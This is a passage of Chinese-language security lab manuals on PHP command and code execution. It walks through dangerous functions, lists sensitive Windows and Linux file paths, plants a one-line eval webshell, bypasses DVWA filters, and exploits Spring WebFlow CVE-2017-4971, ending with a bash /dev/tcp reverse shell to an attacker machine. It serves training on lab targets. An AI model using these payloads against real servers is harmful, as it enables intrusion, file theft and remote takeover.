4、切换到浏览器，对浏览器做代理设置，，与Bp的代理一致 5、访问http://ip/include/include.php&gt;page=php://input，抓取数据包 6、鼠标右击，点击”Send to Repeater”（或者快捷键”Ctrl” + “R”），发送数据包到Repeater模块，然后切换到Repeater模块 7、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”&amp;”管道符前后两个命令都正确的结果 8、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”&amp;”管道符前面命令错误，后面命令正确的结果 9、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”&amp;”管道符前面命令正确，后面命令错误的结果 10、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”&amp;&amp;”管道符前后两个命令都正确的结果 11、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”&amp;&amp;”管道符前面命令错误，后面命令正确的结果 12、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”&amp;&amp;”管道符前面命令正确，后面命令错误的结果 13、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”|”管道符前后两个命令都正确的结果 14、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”|”管道符前面命令错误，后面命令正确的结果 15、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”|”管道符前面命令正确，后面命令错误的结果 16、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”||”管道符前后两个命令都正确的结果 17、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”||”管道符前面命令错误，后面命令正确的结果 18、在数据包中输入”“，点击上面的”Go”，发送修改后的数据包，查看”||”管道符前面命令正确，后面命令错误的结果 实验总结通过本实验，掌握Windows操作系统和Linux操作系统常用通道符的用法以及区别，可以用来绕过命令执行。 危险函数之array_map函数实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/3.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;·&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/3.php 2、在URL后拼接”?arr&#x3D;print_r”，访问http://ip/os/3.php?arr=print_r，打印数组 3、在URL后拼接”?arr&#x3D;phpinfo”，访问http://ip/os/3.php?arr=phpinfo，查看执行效果 实验总结通过本实验，掌握array_map函数的利用，ayyay_map函数为数组的每个元素应用回调函数，当攻击者可以控制函数的输入，从而利用array_map函数进行代码执行。 危险函数之eval函数实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/eval.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;`&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/eval.php 2、在URL后拼接”?a&#x3D;echo ‘This is test’;”，访问http://ip/os/eval.php?a=echo ‘This is test’;，执行代码 3、在URL后拼接”?a&#x3D;phpinfo();”，访问http://ip/os/eval.php?a=phpinfo();，查看执行效果 实验总结通过本实验，掌握eval函数的利用，成功实现了代码执行，体验了eval函数实现代码执行的过程。eval函数的作用是将字符串当作PHP代码执行。 危险函数之assert函数实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/assert.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;`&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/assert.php 2、在URL后拼接”?a&#x3D;var_dump(array(1,2,3))，访问http://ip/os/assert.php?a=var_dump(array(1,2,3))，执行代码 3、在URL后拼接”?a&#x3D;phpinfo();”，访问http://ip/os/assert.php?a=phpinfo()，查看执行效果 实验总结通过本实验，掌握assert函数的利用，成功实现了代码执行，体验了assert函数实现代码执行的过程。assert函数的作用同eval函数类似，也是将字符串当作PHP代码执行。 危险函数之preg_replace函数实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/preg_replace.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;`&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/preg_replace.php 2、在URL后拼接”?a&#x3D;var_dump(array(1,2,3))，访问http://ip/os/preg_replace.php?a=var_dump(array(1,2,3))，执行代码 3、在URL后拼接”?a&#x3D;phpinfo();”，访问http://ip/os/preg_replace.php?a=phpinfo()，查看执行效果 实验总结通过本实验，掌握preg_replace函数的利用，成功实现了代码执行，体验了preg_replace函数实现代码执行的过程。preg_replace函数的作用是搜索subject中正则匹配pattern的部分，以replacement进行替换。pattern：要搜索的模式，可以是一个字符串或字符串数组。当pattern出存在一个“&#x2F;e”修饰符时，$replacement的值会被当成php代码来执行。 危险函数之call_user_func函数实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/call_user_func.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;`&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/call_user_func.php 2、在URL后拼接”?a&#x3D;assert&amp;b&#x3D;var_dump(array(1,2,3))，访问http://ip/os/call_user_func.php?a=var_dump(array(1,2,3))，执行代码 3、在URL后拼接”?a&#x3D;assert&amp;b&#x3D;phpinfo()”，访问http://ip/os/call_user_func.php?a=assert&amp;b=phpinfo()，查看执行效果 实验总结通过本实验，掌握call_user_func函数的利用，成功实现了代码执行，体验了call_user_func函数实现代码执行的过程。call_user_func函数的作用是回调函数，把第一个参数作为回调函数使用，其余参数都是回调函数的参数。 危险函数之可变函数实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/kbhs.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;`&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/kbhs.php 2、在URL后拼接”?a&#x3D;assert&amp;b&#x3D;var_dump(array(1,2,3))，访问http://ip/os/kbhs.php?a=var_dump(array(1,2,3))，执行代码 3、在URL后拼接”?a&#x3D;assert&amp;b&#x3D;phpinfo()”，访问http://ip/os/kbhs.php?a=assert&amp;b=phpinfo()，查看执行效果 实验总结通过本实验，掌握可变函数的利用，成功实现了代码执行，体验了可变函数实现代码执行的过程。可变函数会把第一个参数作为函数使用，其余参数都是函数的参数。 远程命令执行漏洞利用之利用PHP魔术常量获取信息实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/assert.php 实验原理探测到网站存在远程命令执行漏洞，可以利用PHP魔术常量获取相关信息。PHP 向它运行的任何脚本提供了大量的预定义常量。不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。有八个魔术常量它们的值随着它们在代码中的位置改变而改变。 12345678__LINE__ 文件中的当前行号__FILE__ 文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名__DIR__ 文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录__FUNCTION__ 该常量所在的函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小写）。在PHP4中该值总是小写字母的__CLASS__ 该类被定义时的名字（PHP 4.3.0 新加）。自PHP5起本常量返回该类被定义时的名字（区分大小写）__TRAIT__ Trait的名字（PHP 5.4.0 新加）。自PHP5.4.0起，PHP实现了代码复用的一个方法，称为traits__METHOD__ 类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）__NAMESPACE__ 当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增） 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/assert.php 2、在URL后拼接”?a&#x3D;print(LINE)，访问http://ip/os/assert.php?a=print(__LINE__)，执行代码，获取当前代码所在的行数 3、在URL后拼接”?a&#x3D;print(DIR)，访问http://ip/os/assert.php?a=print(__DIR__)，执行代码，获取当前文件所在的目录 4、在URL后拼接”?a&#x3D;print(FILE)，访问http://ip/os/assert.php?a=print(__FILE__)，执行代码，获取当前文件的完整路径 实验总结通过本实验，掌握远程命令执行漏洞的利用，借助PHP中的魔术常量，获取相关信息。 远程命令执行漏洞利用之读取文件实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/assert.php 实验原理利用远程命令执行漏洞可以读取一些操作系统的敏感文件，从而获取重要信息。Windows系统敏感信息： 123456C:\\boot.ini //查看系统版本C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件C:\\windows\\repair\\sam //windows初次安装的密码C:\\program Files\\mysql\\my.ini //Mysql配置信息C:\\program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\windows\\php.ini //php配置信息...... Linux系统敏感信息： 123456/etc/passwd //linux用户信息/usr/local/app/apache2/conf/httpd.conf //apache2配置文件/usr/local/app/php5/lib/php.ini //php配置文件/etc/httpd/conf/httpd.conf //apache配置文件/etc/my.cnf //Mysql配置文件...... 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/assert.php 2、在URL后拼接”?a&#x3D;var_dump(file_get_contents(‘C:\\Windows\\System32\\drivers\\etc\\hosts’))＂，访问http://ip/os/assert.php?a=var_dump(file_get_contents(‘C:\\Windows\\System32\\drivers\\etc\\hosts’))，执行代码，获取hosts文件信息 3、在URL后拼接”?a&#x3D;var_dump(file_get_contents(‘C:\\Windows\\win.ini’))＂，访问http://ip/os/assert.php?a=var_dump(file_get_contents(‘C:\\Windows\\win.ini’))，执行代码，获取win.ini文件信息 实验总结通过本实验，掌握远程命令执行漏洞的利用，读取敏感文件，获取重要信息，所以需要尽可能多的收集敏感文件的路径。 远程命令执行漏洞利用之一句话木马实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/assert.php 实验原理利用远程命令执行漏洞可以执行一句话木马，从而GetShell，借助WebShell工具连接一句话木马。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/assert.php 2、在URL后拼接”?a&#x3D;@eval($_POST[666])”，访问http://ip/os/assert.php?a=@eval($_POST[666])，执行代码，构造一句话木马（Warning警告，但是并不影响） 3、打开桌面tools文件夹的“中国菜刀（过狗）”，双击exe文件 4、在空白处鼠标右击，点击“添加”，添加shell地址 地址为：一句话木马地址和连接密码 脚本类型：PHP 5、点击“添加”，双击一句话木马地址 实验总结通过本实验，掌握远程命令执行漏洞的利用，执行一句话木马文件，从而GetShell。 远程命令执行漏洞利用之写shell实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/assert.php 实验原理利用远程命令执行漏洞可以执行写文件的代码，生成新的脚本文件。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/assert.php 2、在URL后拼接”?a&#x3D;var_dump(file_put_contents($_POST[1],$_POST[2]))”，访问http://ip/os/assert.php?a=var_dump(file_put_contents($_POST[1],$_POST[2]))，并发送post数据：1=info.php&amp;2=，成功执行代码（Warning警告，但是并不影响） 3、访问http://ip/os/info.php，新生成的info.php脚本文件成功解析执行 4、在URL后拼接”?a&#x3D;var_dump(file_put_contents($_POST[1],$_POST[2]))”，访问http://ip/os/assert.php?a=var_dump(file_put_contents($_POST[1],$_POST[2]))，并发送post数据：1=shell.php&amp;2=，成功执行代码（Warning警告，但是并不影响） 5、访问http://ip/os/shell.php，无任何报错，shell.php一句话木马文件成功生成 6、打开桌面tools文件夹的“中国菜刀（过狗）”，双击exe文件 7、在空白处鼠标右击，点击“添加”，添加shell地址 地址为：一句话木马地址和连接密码 脚本类型：PHP 8、点击“添加”，双击一句话木马地址 实验总结通过本实验，掌握远程命令执行漏洞的利用，执行生成代码的文件，从而生成新的脚本文件或者一句话木马文件。 危险函数之system函数实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/system.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;`&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/system.php 2、在URL后拼接”?a&#x3D;ipconfig”，访问http://ip/os/system.php?a=ipconfig，执行代码 3、在URL后拼接”?a&#x3D;whoami”，访问http://ip/os/system.php?a=whoami，执行代码 实验总结通过本实验，掌握system函数的利用，成功实现了系统命令执行，体验了system函数实现系统命令执行的过程。system函数的作用是执行操作系统命令。 危险函数之exec函数实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/exec.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;`&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/exec.php 2、在URL后拼接”?a&#x3D;ipconfig”，访问http://ip/os/exec.php?a=ipconfig，执行代码 3、在URL后拼接”?a&#x3D;whoami”，访问http://ip/os/exec.php?a=whoami，执行代码 实验总结通过本实验，掌握exec函数的利用，成功实现了系统命令执行，体验了exec函数实现系统命令执行的过程。exec函数的作用是执行操作系统命令。 危险函数之shell_exec函数实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/shell_exec.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;`&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/shell_exec.php 2、在URL后拼接”?a&#x3D;ipconfig”，访问http://ip/os/shell_exec.php?a=ipconfig，执行代码 3、在URL后拼接”?a&#x3D;whoami”，访问http://ip/os/shell_exec.php?a=whoami，执行代码 实验总结通过本实验，掌握shell_exec函数的利用，成功实现了系统命令执行，体验了shell_exec函数实现系统命令执行的过程。shell_exec函数的作用是执行操作系统命令。 危险函数之passthru函数实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/passthru.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;`&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/passthru.php 2、在URL后拼接”?a&#x3D;ipconfig”，访问http://ip/os/passthru.php?a=ipconfig，执行代码 3、在URL后拼接”?a&#x3D;whoami”，访问http://ip/os/passthru.php?a=whoami，执行代码 实验总结通过本实验，掌握passthru函数的利用，成功实现了系统命令执行，体验了passthru函数实现系统命令执行的过程。passthru函数的作用是执行操作系统命令。 危险函数之popen函数实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/popen.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;`&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/popen.php 2、在URL后拼接a的参数值，比如”?a&#x3D;1”，访问http://ip/os/popen.php?a=1，执行代码，无任何报错 3、访问http://ip/os/1.txt，查看新建的执行结果的文件 实验总结通过本实验，掌握popen函数的利用，成功实现了系统命令执行，体验了popen函数实现系统命令执行的过程。popen函数的作用是执行操作系统命令。 危险函数之反引号实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/fdyh.php 实验原理应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。 123456789101112131415PHP中常见代码执行函数：array_map()eval()assert()preg_replace()call_user_func()$a($b)动态函数PHP中常见系统命令执行函数：system()exec()shell_exec()passthru()popen()反引号&quot;`&quot; 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/fdyh.php 2、在URL后拼接a的参数值，比如”?a&#x3D;1”，访问http://ip/os/fdyh.php?a=1，执行代码，输出想要的结果 实验总结通过本实验，掌握反引号的利用，成功实现了系统命令执行，体验了利用反引号实现系统命令执行的过程。 系统命令执行漏洞利用之执行操作系统命令实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/system.php 实验原理利用系统命令执行漏洞可以执行一些操作系统命令，从而获取重要信息。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/system.php 2、在URL后拼接”?a&#x3D;cd”，访问http://ip/os/system.php?a=cd，执行代码，查看当前文件的绝对路径 3、在URL后拼接”?a&#x3D;dir”，访问http://ip/os/system.php?a=dir，执行代码，查看当前目录下的所有文件 4、在URL后拼接”?a&#x3D;net user”，访问http://ip/os/system.php?a=net user，执行代码，查看所有用户 5、在URL后拼接”?a&#x3D;typec:\\windows\\system32\\drivers\\etc\\hosts”，访问http://ip/os/system.php?a=typec:\\windows\\system32\\drivers\\etc\\hosts，执行代码，查看hosts文件 实验总结通过本实验，掌握系统命令执行漏洞的利用，通过系统命令执行漏洞，执行操作系统的相关命令，获取重要信息。 系统命令执行漏洞利用之写shell实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，体验命令执行漏洞的利用过程。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/os/system.php 实验原理利用系统命令执行漏洞可以执行写文件的代码，生成新的脚本文件。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/os/system.php 2、在URL后拼接：?a&#x3D;echo “” &gt;C:\\server\\apache22\\htdocs\\os\\info.php，访问http://ip/os/system.php??a=echo“” &gt;C:\\server\\apache22\\htdocs\\os\\info.php，执行代码 3、访问http://ip/os/info.php，新生成的info.php脚本文件成功解析执行 4、在URL后拼接：?a&#x3D;echo “” &gt;C:\\server\\apache22\\htdocs\\os\\shell.php，访问http://ip/os/system.php?a=echo“” &gt;C:\\server\\apache22\\htdocs\\os\\shell.php，执行代码 5、访问http://ip/os/shell.php，无任何报错，shell.php一句话木马文件成功生成 6、打开桌面tools文件夹的“中国菜刀（过狗）”，双击exe文件 7、在空白处鼠标右击，点击“添加”，添加shell地址 地址为：一句话木马地址和连接密码 脚本类型：PHP 8、点击“添加”，双击一句话木马地址 实验总结通过本实验，掌握系统命令执行漏洞的利用，执行生成代码的文件，从而生成新的脚本文件或者一句话木马文件。 命令执行之DVWA实验目的通过本实验，掌握命令执行漏洞产生的原因和利用方法，通过源码分析深入了解命令执行漏洞的利用过程以及绕过防御的方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/dvwa/login.php 实验原理借助DVWA靶场，通过不同等级的命令执行源代码分析，掌握命令执行的防御方法以及绕过防御的方法。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/dvwa/login.php 2、输入Username：admin和Password：password，登陆靶场 3、首先选中”DVWA Security”，调整级别为”Low”级别提交 4、选中”Command Injection”，跳转到命令执行环境下 5、正常逻辑应该输入IP地址，做ping请求 6、利用管道符号的用法，在输入IP地址的同时，结合管道符号和其他操作系统命令，执行获取重要信息 7、选中”DVWA Security”，调整级别为”Medium”级别提交 8、选中”Command Injection”，跳转到命令执行环境下，还是输入IP地址，做ping请求 9、利用管道符号的用法，在输入IP地址的同时，结合管道符号和其他操作系统命令，执行失败 10、点击右下角的”View Source”，查看该等级源代码，过滤了”&amp;&amp;、;” 11、输入”IP地址&amp;操作系统命令”，绕过Medium级别的过滤，获取重要信息 12、选中”DVWA Security”，调整级别为”High”级别提交 13、选中”Command Injection”，跳转到命令执行环境下，还是输入IP地址，做ping请求 14、利用管道符号的用法，在输入IP地址的同时，结合管道符号和其他操作系统命令，执行失败 15、点击右下角的”View Source”，查看该等级源代码，过滤了”&amp;、;、| 、-、$、(、)、&#96;、||” 16、输入”IP地址|操作系统命令”，绕过High级别的过滤，获取重要信息 实验总结通过本实验，掌握系统命令执行漏洞的利用，借助DVWA靶场对不同级别的命令执行进行代码分析，深入了解命令执行漏洞的成因、防御以及绕过方法，从而执行操作系统的相关命令，获取重要信息。 Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）实验目的通过本实验，掌握Spring WebFlow 远程代码执行漏洞原理和利用方法，加深了解Spring WebFlow框架。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 操作机：kali用户名：root密码：Sangfor!7890 靶机：Ubuntu + docker用户名：root密码：Sangfor!7890 实验地址：http://ip:8080/login 实验原理由于Spring的框架越来越多，而且后面引入了SpringEl作为默认的表达式解析方式，所以一旦引入了类似于OGNL的表达式，很可能会带来一些安全问题。本次漏洞就是由于Spring WebFlow是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。 漏洞介绍该漏洞在2017年5月31号被提交到https://pivotal.io/security/cve-2017-4971平台，官方并没有详细的信息，通过官方描述和补丁的对比，我们可以大致推断应该是Spring WebFlow在Model的数据绑定上面，由于没有明确指定相关model的具体属性导致从表单可以提交恶意的表达式从而被执行，导致任意代码执行的漏洞，这个漏洞利用除了版本的限制之外还有两个前置条件，这两个前置条件中有一个是默认配置，另外一个就是编码规范了，漏洞能不能利用成功主要就取决于后面的条件。 实验步骤第一步 启动目标靶机的环境1、登陆”Spring WebFlow”靶机，执行如下命令，进入目标环境所在目录 123cd /vulhub-mastercd springcd CVE-2017-4971 2、执行以下命令，运行目标靶机的环境 1docker-compose up -d 3、登陆“Attack”操作机，打开浏览器，访问http:&#x2F;&#x2F;靶机ip:8080，看到酒店预订页面，说明靶机环境启动成功 第二步 漏洞复现4、通过“Attack”操作机的浏览器访问http:&#x2F;&#x2F;靶机ip:8080，看到登录页面 5、用页面左边给出的任意一个账号&#x2F;密码登录网站 6、访问id为1的酒店http:&#x2F;&#x2F;靶机ip:8080&#x2F;hotels&#x2F;1，点击预订按钮“Book Hotel”，填写相关信息后点击“Process”（从这一步WebFlow就正式开始了） 7、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 8、切换到“Proxy”代理模块的“Options”，查看Bp的代理 9、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 10、点击确认“Confirm”按钮，确认酒店预订信息，Bp成功抓取数据包，然后将数据包send to repeater 11、修改数据包，加入要执行的代码，然后发送数据包，会返回500的状态码（注意：一定要URL编码，即new+java.lang.ProcessBuilder） 创建文件POC 1_(new java.lang.ProcessBuilder(&quot;touch&quot;,&quot;/tmp/success&quot;)).start()=sy 验证文件是否创建成功 12、进入靶机服务器，在docker靶机里可以看到已经在&#x2F;tmp目录下成功创建了success文件（注意：是进入docker里），执行如下命令 1234docker ps 查看靶机环境对应的docker容器IDdocker exec -it 容器ID bash 进入docker环境cd /tmp 进入tmp目录ls 查看文件 反弹shell 13、首先在kali输入以下命令来监听端口 1nc -l -p 21 14、修改数据包，输入POC【_(new java.lang.ProcessBuilder(“bash”,”-c”,“bash -i &amp; &#x2F;dev&#x2F;tcp&#x2F;【kali攻击机ip】&#x2F;21 0&gt;&amp;1”)).start()&#x3D;sy】反弹shell 15、获得shell，可以执行系统命令 实验总结通过本实验，对Spring WebFlow框架进行远程代码执行，成功向服务器写入文件，并执行相关命令反弹shell，深入了解远程代码执行漏洞的危害。 